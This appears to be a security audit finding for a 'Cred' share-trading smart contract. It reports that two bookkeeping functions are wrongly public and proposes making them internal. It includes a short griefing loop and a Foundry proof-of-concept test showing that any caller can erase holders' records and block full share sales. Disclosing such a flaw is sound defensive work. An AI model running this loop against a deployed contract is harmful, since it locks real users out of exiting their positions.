# Vulnerability details

It looks like some auxiliary bookkeeping functions, namely `_addCredIdPerAddress` and `_removeCredIdPerAddress`, were
added with incorrect visibility specified: `public` instead of `internal`.

## Impact

The state managed by the functions is not critical: luckily, the shares counters are unaffected. Presumably, the 
functions were added for easier off-chain access. However, anyone can partially disrupt the protocol operation 
and availability just with a few lines of code:

```solidity
        for (uint cr = 1; cr < cred.credIdCounter(); cr++) {
            address[] memory holders = cred.getCuratorAddresses(cr, 0, 0);
            for (uint i = 0; i < holders.length; i++)
                cred._removeCredIdPerAddress(cr, holders[i]);
        }
```

Such griefing is easily performable on cheap gas chains. The mitigation of such damage will require upgrading the
contract and restoring its state by some script.

## Proof of Concept

Please insert this test into `test/Cred.t.sol` and run with `forge test --match-test testBlockingAllSelling`:

```solidity
    function testBlockingAllSelling() public {
        _createCred("BASIC", "SIGNATURE", 0x0);

        // user1 buying
        vm.deal(user1, 1 ether);
        vm.startPrank(user1);
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 1);
        uint256 maxPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 2);
        cred.buyShareCred{ value: buyPrice }(1, 1, maxPrice);
        assertEq(cred.isShareHolder(1, user1), true, "cred 1 is voted by user1");
        vm.stopPrank();

        // user2 buying
        vm.deal(user2, 1 ether);
        vm.prank(user2);
        cred.buyShareCred{ value: 0.1 ether }(1, 2, 0);
        assertEq(cred.isShareHolder(1, user2), true, "cred 1 is voted by user2");
        vm.warp(block.timestamp + 10 minutes + 1 seconds);

        // Anyone partially disrupts the selling in the whole protocol just with a few lines of code:
        vm.startPrank(anyone);
        for (uint cr = 1; cr < cred.credIdCounter(); cr++) {
            address[] memory holders = cred.getCuratorAddresses(cr, 0, 0);
            for (uint i = 0; i < holders.length; i++)
                cred._removeCredIdPerAddress(cr, holders[i]);
        }
        vm.stopPrank();

        // Blocked selling
        vm.startPrank(user1);
        vm.expectRevert(ICred.EmptyArray.selector);
        cred.sellShareCred(1, 1, 0);
        vm.stopPrank();

        vm.startPrank(user2);
        cred.sellShareCred(1, 1, 0);    // partial selling is fine
        vm.expectRevert(ICred.EmptyArray.selector);
        cred.sellShareCred(1, 1, 0);    // full exit is blocked
        vm.stopPrank();
    }
```

## Tools Used

Manual Review, Foundry

## Recommended Mitigation Steps

Change the `_addCredIdPerAddress` and `_removeCredIdPerAddress` functions visibility to `internal` or `private`.




## Assessed type

Access Control
